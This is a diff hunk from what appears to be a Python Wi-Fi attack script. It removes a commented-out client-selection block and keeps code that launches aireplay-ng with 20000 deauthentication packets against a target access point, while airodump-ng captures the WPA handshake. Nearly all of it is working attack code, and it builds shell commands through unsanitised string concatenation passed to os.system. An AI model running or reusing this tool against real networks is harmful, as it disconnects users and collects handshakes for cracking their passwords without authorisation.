@@ -68,44 +68,6 @@ def wpa():
             except KeyboardInterrupt:
                 pass
         else:
-            '''
-            print("[CTRL+C] press CTRL+C to exit when you have descoverd enought clients")
-            try:
-                command = "airodump-ng -w cap-temp/ -c "+ch+" --bssid "+mac+" -w cap-temp/ "+ineterface
-                os.system(command)
-            except Exception:
-                pass
-
-            file = open("cap-temp/-01.csv","r")
-            f = file.read()
-            f = f.replace("Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs","")
-            f = f.split("\n")
-            xx = 5
-            try:
-                while True:
-                    if f[xx] == "":
-                        pass
-                    else:
-                        print(xx," ",f[xx])
-                    xx = xx + 1
-            except Exception:
-                pass
-
-            c = int(input("[#] enter client num \n----> "))
-            g = f[c]
-            g = g.split(",")
-            cl_mac = g[5]
-            cl_mac = cl_mac.replace(" ","")
-            print("[#] client: ", cl_mac)
-            print("[#] cleaning temp files...")
-            del_file = ["-01.cap","-01.csv","-01.kismet.csv","-01.kismet.netxml","-01.log.csv"]
-            os.system("clear")
-            for f in del_file:
-                c = "rm cap-temp/"+f
-                os.system(c)
-            os.system("clear")
-            print("[#] client: ", cl_mac)
-            '''
             print("[#] attacking...")
             command = "xterm -geometry 100x-50-0-0 -e  'aireplay-ng -0 20000 -a "+mac+" "+ ineterface+"' | xterm -geometry 100x50+0+0 -e 'airodump-ng -w cap-temp/ -c "+ch+" --bssid "+mac+" -w cap-temp/ "+ineterface+"'"
             print("[CTRL+C] press CTRL+C on this screen when handshake is captured")
